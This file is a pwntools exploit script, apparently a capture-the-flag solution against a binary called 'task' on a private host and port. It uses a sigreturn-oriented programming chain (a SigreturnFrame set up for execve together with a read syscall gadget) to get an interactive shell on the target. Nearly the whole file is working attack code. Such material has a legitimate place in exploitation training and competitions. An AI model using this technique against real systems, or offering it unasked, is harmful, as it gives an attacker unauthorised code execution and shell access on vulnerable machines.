#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 192.168.12.13 --port 1555 task
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'task')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '192.168.12.13'
port = int(args.PORT or 1555)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak _start
# continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x40000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

SYSCALL = exe.sym['_start'] + 21
POP_RAX = exe.sym['_start'] + 24


frame = SigreturnFrame()
frame.rax = constants.SYS_execve
# frame.rdi = next(exe.search(b'/bin/bash'))
frame.rdi = 0x41430
frame.rip = SYSCALL

io.send(flat([
    0,
    POP_RAX,
    constants.SYS_read,
    exe.sym['_start'],
    SYSCALL,
    frame
]))

io.send(flat([
    0,
    SYSCALL
])[:0xf])

io.interactive()

